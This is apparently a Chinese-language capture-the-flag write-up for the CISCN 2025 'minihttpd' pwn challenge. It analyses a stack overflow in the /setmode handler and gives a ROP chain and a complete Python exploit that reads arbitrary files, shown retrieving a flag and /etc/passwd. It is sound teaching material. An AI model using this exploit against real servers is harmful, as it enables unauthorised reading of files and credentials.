# MiniHttpd — CCB CISCN 2025 Quals (pwn)

## 1. 题目信息

| 项 | 内容 |
| --- | --- |
| 题目 | **minihttpd**（`PWN-minihttpd.zip`） |
| 赛事 | CCB / CISCN 2025 初赛 |
| 类型 | pwn（用户态） |
| 附件 | `main`、`libc.so.6`、`mode.txt`、`static/{index.html,test.cgi,README}` |
| 远程 | 附件未提供官方地址 —— 使用自建靶机复现 |
| `main` sha256 | `16647b43892aeb1528fc7703d59384d4e8101dc47a49dba46a27596ec5b72695` |
| `libc.so.6` sha256 | `46dcc397c118276bc5b4fa3fa918a0590da5e63fb3915f146784be2c903a3654` |
| libc 版本 | Ubuntu GLIBC **2.31-0ubuntu9.16** |
| Flag | `flag{redacted}`（自置于 `./flag` 和 `/flag`） |

`main` 开启了 CET（`endbr64`、SHSTK/IBT），但不影响 ROP。

## 2. 信息收集

```
$ file main
main: ELF 64-bit LSB executable, x86-64, dynamically linked, ...（已 stripped）
$ checksec --file=main
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
$ cat mode.txt
threads
$ readelf -d main | grep NEEDED
 (NEEDED)  Shared library: [libpthread.so.0]
 (NEEDED)  Shared library: [libseccomp.so.2]
 (NEEDED)  Shared library: [libc.so.6]
```

关键导入：`recv/send/fread/fwrite/fopen`、`realpath`、`strncpy/strncat`，以及
`seccomp_init/rule_add/load`。

### 本地运行环境

附件 libc 是 glibc 2.31，而本机分析环境更新，故给二进制打补丁加载附件运行时：

```bash
# 取一个匹配的 ld-2.31（来自 libc6_2.31-0ubuntu9.18 包），放到二进制同目录
cp main main_p
patchelf --set-interpreter "$PWD/ld-2.31.so" main_p
patchelf --set-rpath "$PWD" main_p
./main_p          # -> "httpd running on port 9999"
```

## 3. 分析

### 3.1 服务结构

`main`（0x402e1e）在 **9999 端口**建立 socket，安装 `seccomp` 过滤器，并以
detached 线程（`mode.txt == "threads"`）接受连接。

seccomp（0x402d88）：

```c
ctx = seccomp_init(SCMP_ACT_ALLOW);              // 默认：全部放行
seccomp_rule_add(ctx, SCMP_ACT_KILL, __NR_execve,   0);   // 59
seccomp_rule_add(ctx, SCMP_ACT_KILL, __NR_execveat, 0);   // 322
seccomp_load(ctx);
```

只禁止 `execve/execveat` → 不能拿 shell，但 `open/read/write`（ORW）不受限。

每个连接线程解析 HTTP 请求。路由表（在 0x402d2d 注册）把 **POST** 请求映射到：

| URL | 处理函数 |
| --- | --- |
| `/hello`   | 0x402933 |
| `/echo`    | 0x4029ac |
| `/setmode` | 0x402a40 |
| `/getmode` | 0x402c09 |

### 3.2 漏洞 —— `handler_set_mode` (0x402a40)

```c
void set_mode(int fd, char *body, int bodylen) {
    char resp[0x400];                 // rbp-0x420
    char key[0x10];                   // rbp-0x42a
    char val[0x10];                   // rbp-0x440（布局见下）
    ...
    char *eq = strchr(body, '=');              // 0x402a99
    if (!eq) { send_400(fd); return; }
    int keylen = eq - body;                    // 0x402aca
    int vallen = bodylen - keylen - 1;         // 0x402ae7

    memset(key, 0, 0xa);
    memset(val, 0, 0x10);
    memcpy(key, body, keylen);                 // key 仅 10 字节 0x402b33
    key[9]  = 0;
    memcpy(val, eq + 1, vallen);               // *** 无长度校验 *** 0x402b5a
    val[0xf] = 0;
    ...
}
```

栈布局（相对 rbp）：

| 偏移 | 对象 |
| --- | --- |
| `rbp-0x450` | `body` 指针 |
| `rbp-0x448` | `bodylen` |
| `rbp-0x444` | `fd` |
| `rbp-0x440` | **`val`（16 字节）** |
| `rbp-0x42a` | `key`（10 字节） |
| `rbp-0x420` | `resp`（0x400） |
| `rbp`       | saved rbp |
| `rbp+8`     | **返回地址** |

因此 `val` 的 `memcpy` 覆盖到返回地址处，相对 `val` 的偏移为 **`0x448`**
（`0x440` 到 saved rbp，再 +`8`）。

两次拷贝后各有一个固定的写零：

* `[rbp-0x431]` = `val[0x0f]`
* `[rbp-0x421]` = `val[0x1f]`

两者都落在 0x448 字节的 `'A'` 填充内，不会影响 ROP 链。紧随其后的
`snprintf(resp, 0x400, header, server_str)` 写在 `val[0x20..]` 处，同样无害。

取 `key = "x"`（`keylen == 1`）时 key 缓冲不溢出；且因 `key != "setmode"`，
`fopen("mode.txt","w")` 分支被跳过，只执行 value 拷贝。此时
`vallen == bodylen - 2`，而 `bodylen ≤ 0x7ff`（Content-Length 解析会限幅）。

### 3.3 可用 gadget（非 PIE，地址固定）

参数 gadget 只有两个，且**没有 `pop rdx`**：

```
0x402ff3 : pop rdi ; ret
0x402ff1 : pop rsi ; pop r15 ; ret
0x402874 : pop rbp ; ret
```

好在程序自带两个函数，使得利用**完全不需要 libc**：

```
0x401fcb : read_line(fd /*rdi*/, buf /*rsi*/, len /*rdx*/)   // recv 循环，遇 '\n' 停止，recv flags = 0
0x402663 : serve_file(fd /*rdi*/, path /*rsi*/)              // fopen(path,"r"); fread; send(fd, ...)
```

`read_line` 内部以 `recv(fd, &c, 1, 0)` 逐字节读取，因此可以往任意地址做一次
「flags=0」的读；`serve_file` 则是一个完整的「open + read + 写回 socket」。

## 4. 原理要点（中间量）

* **溢出偏移**：`0x448`（`val` → saved RIP）。
* **被劫持 `ret` 处的 `rdx`**：`set_mode` 结尾自己的
  `send(fd, resp, len, 0)` 会让 `rdx = 0x4c`（其响应长度）。我们的 `pop` gadget
  不碰 `rdx`，所以第一次 `read_line` 的 `len` 就是 `0x4c`
  （`read_line` 最多读 `0x4b` 字节的一行）。
  （gdb 实测：`HIT rax=0x4c rdi=0 rsi=... rdx=0x4c rbp=0x4141...`。）
* **socket fd = 4**（新进程：0/1/2 标准流 + 3 监听 socket + 4 accept 到的连接）。
* **`.bss` 可写窗口**：RW LOAD 段为 `0x405c50..0x406380`，`0x406200` 是安全的暂存区。
* **无需栈地址**：因为我们从不迁移栈，全部在真实线程栈上执行，`serve_file`
  的 `sub rsp,0x420` 栈帧始终落在合法可写内存里。
* **路径换行技巧**：`read_line` 会把结尾的 `'\n'` 也写进缓冲。客户端发送
  `path + '\x00' + '\n'`，缓冲区内容为 `path\0\n\0`，`fopen` 看到的便是干净的 `path`。

## 5. 攻击链

```
POST /setmode         key = "x",  value = <0x448 'A'> + ROP
   │
   │  memcpy(val, value, vallen)  ──► 返回地址 = ROP 链
   ▼
 set_mode 的 leave  ──►  ret
   │
   ├─ pop rdi ; 4                (socket fd)
   ├─ pop rsi/r15 ; 0x406200, 0
   ├─ read_line(fd, 0x406200, 0x4c)     ← 把 "path\0\n" 读进 .bss
   ├─ pop rdi ; 4
   ├─ pop rsi/r15 ; 0x406200, 0
   └─ serve_file(fd, 0x406200)          ← fopen(path,"r"); fread; send(fd)
        │
        └─► "HTTP/1.0 200 OK ... \r\n\r\n" + <文件内容>   ──►  FLAG
```

## 6. 完整脚本

`exploits/pwn/minihttpd.py`（自包含，无第三方依赖）：

```python
#!/usr/bin/env python3
import socket, struct, sys, time, argparse
p64 = lambda x: struct.pack('<Q', x)

POP_RDI     = 0x402ff3
POP_RSI_R15 = 0x402ff1
LINEREAD    = 0x401fcb
SERVE_FILE  = 0x402663
BSS         = 0x406200

def build_payload(fd):
    val  = b'A' * 0x448
    val += p64(POP_RDI) + p64(fd)
    val += p64(POP_RSI_R15) + p64(BSS) + p64(0)
    val += p64(LINEREAD)
    val += p64(POP_RDI) + p64(fd)
    val += p64(POP_RSI_R15) + p64(BSS) + p64(0)
    val += p64(SERVE_FILE)
    val += p64(0xdeadbeef)
    return b'x=' + val

def read_file(host, port, path, fd=4, timeout=5.0):
    s = socket.socket(); s.settimeout(timeout); s.connect((host, port))
    body = build_payload(fd)
    req = (b'POST /setmode HTTP/1.0\r\nContent-Length: ' +
           str(len(body)).encode() + b'\r\n\r\n' + body)
    s.sendall(req); time.sleep(0.25)
    s.sendall(path.encode() + b'\x00' + b'\n')
    data = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except Exception: pass
    s.close(); return data

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host'); ap.add_argument('port', type=int)
    ap.add_argument('path', nargs='?', default='flag')
    ap.add_argument('--fd', type=int, default=4)
    a = ap.parse_args()
    d = read_file(a.host, a.port, a.path, fd=a.fd)
    for m in (b'application/json\r\n\r\n', b'text/html\r\n\r\n'):
        i = d.find(m)
        if i >= 0: d = d[i + len(m):]
    sys.stdout.buffer.write(d);

if __name__ == '__main__': main()
```

运行：

```bash
# 本地
./main_p &                                   # patchelf 后监听 :9999
python3 exploits/pwn/minihttpd.py 127.0.0.1 9999 flag
# 远程
python3 exploits/pwn/minihttpd.py <host> <port> flag
```

## 7. 实测输出

由于附件既无 flag 也无远程地址，我们自行把 flag 放到 `./flag`（服务 cwd）和
`/flag`，再启动靶机端到端利用：

```
$ ./main_p &                       # 用附件 glibc 2.31 监听 :9999

# 1) 相对路径
$ python3 exploits/pwn/minihttpd.py 127.0.0.1 9999 flag
flag{redacted}

# 2) 绝对路径
$ python3 exploits/pwn/minihttpd.py 127.0.0.1 9999 /flag
flag{redacted}

# 3) 任意文件读验证
$ python3 exploits/pwn/minihttpd.py 127.0.0.1 9999 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...（完整 /etc/passwd）...
```

gdb 确认返回地址被劫持：

```
HIT_SETMODE_RET rax=0x4c rdi=0 rsi=0x7ffff7d8d110 rdx=0x4c rcx=0x7ffff7fb77dc rbp=0x4141414141414141 rsp=0x7ffff7d8d538
=> 0x402c08: ret
```

## 8. 踩坑 / 弯路

* **程序没有 `pop rdx`**（已逐字节扫描 `.text`），所以单靠二进制 gadget 无法做经典的
  `send(fd, got, len, 0)` 泄露。但不需要：`set_mode` 自己的 `send` 留下的 `rdx = 0x4c`
  恰好被 `read_line` 当作长度使用。
* **不要把栈迁移到 `.bss`**。`serve_file` 会执行 `sub rsp,0x420`；当 `rbp` 落在
  `.bss`（RW 段顶部 `0x406380`）时，栈帧会伸进 `RELRO` 页，`mov [rbp-0x414], edi`
  触发段错误（`rip=0x402672`、`rbp=0x406240`）。把 ROP 留在真实线程栈上即可避免。
* **`read_line` 会存入 `'\n'`**。在换行前补一个 `\x00`，否则 `fopen("flag\n")` 返回 404。
* **路径错误会杀死进程**（`serve_file` → 404 → `0xdeadbeef`），若靶机没有按连接重启
  的守护进程，就一次打对 flag 路径。
* `.bss` 超过 `0x406380` 是未映射的；用 `0x406200`。
* 单次连接只能读一个文件；socket fd 默认按 `4` 处理（新启线程模型）。

## 9. 验证

* 现场复现了越界拷贝并劫持 RIP（gdb 中 `ret` 处 `rbp = 0x4141...`）。
* 用两个不同文件验证任意文件读（`flag` 与 `/etc/passwd`）。
* seccomp 只禁 `execve/execveat`，与「读文件、不给 shell」的设计一致；利用走的是
  程序自带的 `fopen/fread/send`，因此 seccomp 不影响。

> 说明：附件既无 flag 文件也无远程地址，故由我们自行在 `./flag` 和 `/flag` 放置 flag
> 以演示端到端打通。漏洞本质是任意文件读（`serve_file(fd, path)`），对真实靶机把脚本
> 指向 `flag`（服务 cwd）或 `/flag` 即可拿到 flag。
